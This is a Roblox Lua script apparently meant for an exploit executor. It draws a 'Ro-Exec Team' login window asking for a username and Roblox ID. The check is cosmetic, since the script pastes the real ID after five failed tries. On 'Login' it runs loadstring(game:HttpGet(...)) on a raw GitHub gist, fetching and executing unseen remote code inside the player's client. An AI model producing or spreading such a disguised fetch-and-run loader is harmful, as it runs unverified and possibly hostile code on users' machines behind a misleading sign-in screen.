local ScreenGui = Instance.new("ScreenGui")

local KeySystemFrame = Instance.new("Frame")

local TitleLabel = Instance.new("TextLabel")

local SubTitleLabel = Instance.new("TextLabel")

local UsernameBox = Instance.new("TextBox")

local PasswordBox = Instance.new("TextBox")

local ConfirmCheckBox = Instance.new("TextButton")

local ConfirmLabel = Instance.new("TextLabel")

local LoginButton = Instance.new("TextButton")

local CloseButton = Instance.new("TextButton")

local Notifications = game:GetService("StarterGui")

local Players = game:GetService("Players")

-- Error count for incorrect Roblox ID

local errorCount = 0

local maxErrors = 5

-- Parent to PlayerGui for compatibility

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- UI Properties

KeySystemFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

KeySystemFrame.Size = UDim2.new(0, 420, 0, 320) -- Adjusted size

KeySystemFrame.Position = UDim2.new(0.5, -210, 0.5, -160)

KeySystemFrame.Parent = ScreenGui

KeySystemFrame.BorderSizePixel = 0

KeySystemFrame.ClipsDescendants = true

-- Smooth UI Corners

local UICorner = Instance.new("UICorner", KeySystemFrame)

UICorner.CornerRadius = UDim.new(0, 12)

-- Title Label

TitleLabel.Text = "Welcome Back."

TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

TitleLabel.Font = Enum.Font.GothamBold

TitleLabel.TextSize = 28

TitleLabel.Size = UDim2.new(1, 0, 0.15, 0)

TitleLabel.Position = UDim2.new(0, 0, 0.05, 0)

TitleLabel.BackgroundTransparency = 1

TitleLabel.Parent = KeySystemFrame

-- Subtitle Label (Updated Text)

SubTitleLabel.Text = "Hello, Guest! Join Ro-Exec Team Today"

SubTitleLabel.TextColor3 = Color3.fromRGB(150, 150, 150)

SubTitleLabel.Font = Enum.Font.Gotham

SubTitleLabel.TextSize = 14

SubTitleLabel.Size = UDim2.new(1, 0, 0.1, 0)

SubTitleLabel.Position = UDim2.new(0, 0, 0.18, 0)

SubTitleLabel.BackgroundTransparency = 1

SubTitleLabel.Parent = KeySystemFrame

-- Username Box

UsernameBox.PlaceholderText = "Enter Username"

UsernameBox.TextColor3 = Color3.fromRGB(200, 200, 200)

UsernameBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)

UsernameBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

UsernameBox.BorderSizePixel = 0

UsernameBox.Font = Enum.Font.Gotham

UsernameBox.TextSize = 14

UsernameBox.Size = UDim2.new(0.8, 0, 0.15, 0)

UsernameBox.Position = UDim2.new(0.1, 0, 0.35, 0)

UsernameBox.Parent = KeySystemFrame

-- Password Box

PasswordBox.PlaceholderText = "Enter Roblox ID"

PasswordBox.TextColor3 = Color3.fromRGB(200, 200, 200)

PasswordBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)

PasswordBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

PasswordBox.BorderSizePixel = 0

PasswordBox.Font = Enum.Font.Gotham

PasswordBox.TextSize = 14

PasswordBox.Size = UDim2.new(0.8, 0, 0.15, 0)

PasswordBox.Position = UDim2.new(0.1, 0, 0.55, 0)

PasswordBox.Parent = KeySystemFrame

-- Confirm CheckBox

ConfirmCheckBox.Text = ""

ConfirmCheckBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

ConfirmCheckBox.BorderSizePixel = 0

ConfirmCheckBox.Size = UDim2.new(0.1, 0, 0.1, 0)

ConfirmCheckBox.Position = UDim2.new(0.1, 0, 0.7, 0)

ConfirmCheckBox.Parent = KeySystemFrame

-- Confirm Label

ConfirmLabel.Text = "Continue?"

ConfirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

ConfirmLabel.Font = Enum.Font.Gotham

ConfirmLabel.TextSize = 14

ConfirmLabel.Size = UDim2.new(0.8, 0, 0.1, 0)

ConfirmLabel.Position = UDim2.new(0.2, 0, 0.7, 0)

ConfirmLabel.BackgroundTransparency = 1

ConfirmLabel.Parent = KeySystemFrame

-- Login Button

LoginButton.Text = "Login"

LoginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

LoginButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

LoginButton.BorderSizePixel = 0

LoginButton.Font = Enum.Font.GothamBold

LoginButton.TextSize = 16

LoginButton.Size = UDim2.new(0.8, 0, 0.15, 0)

LoginButton.Position = UDim2.new(0.1, 0, 0.85, 0)

LoginButton.Parent = KeySystemFrame

-- Close Button

CloseButton.Text = "X"

CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)

CloseButton.BackgroundTransparency = 1

CloseButton.Font = Enum.Font.GothamBold

CloseButton.TextSize = 20

CloseButton.Size = UDim2.new(0, 30, 0, 30)

CloseButton.Position = UDim2.new(1, -35, 0, 5)

CloseButton.Parent = KeySystemFrame

-- Notification Function

local function notify(title, text)

    Notifications:SetCore("SendNotification", {

        Title = title;

        Text = text;

        Duration = 3;

    })

end

-- Confirm Checkbox Functionality

ConfirmCheckBox.MouseButton1Click:Connect(function()

    ConfirmCheckBox.Text = ConfirmCheckBox.Text == "" and "✔️" or ""

end)

-- Login Button Functionality

LoginButton.MouseButton1Click:Connect(function()

    local username = UsernameBox.Text

    local robloxId = PasswordBox.Text

    local actualId = tostring(Players.LocalPlayer.UserId)

    if username == "" then

        notify("Error", "Enter a Username!")

        return

    end

    if robloxId ~= actualId then

        errorCount = errorCount + 1

        if errorCount >= maxErrors then

            PasswordBox.Text = actualId

            notify("RO-ID", "ID Pasted!")

        else

            notify("Error", "Incorrect Roblox ID! (" .. errorCount .. "/" .. maxErrors .. ")")

        end

        return

    end

    if ConfirmCheckBox.Text == "" then

        ConfirmLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

        ConfirmLabel.Text = "Confirm before login!"

        wait(2)

        ConfirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

        ConfirmLabel.Text = "Continue?"

        return

    end

    loadstring(game:HttpGet("https://gist.githubusercontent.com/Axchs/4ef5ee7863b560b39dbbba2d46a1eeaf/raw/a74a2dae5cbfa29499c561228515aac4f1168c3e/gistfile1.txt"))()

    ScreenGui:Destroy()

end)

-- Close Button Functionality

CloseButton.MouseButton1Click:Connect(function()

    ScreenGui:Destroy()

end)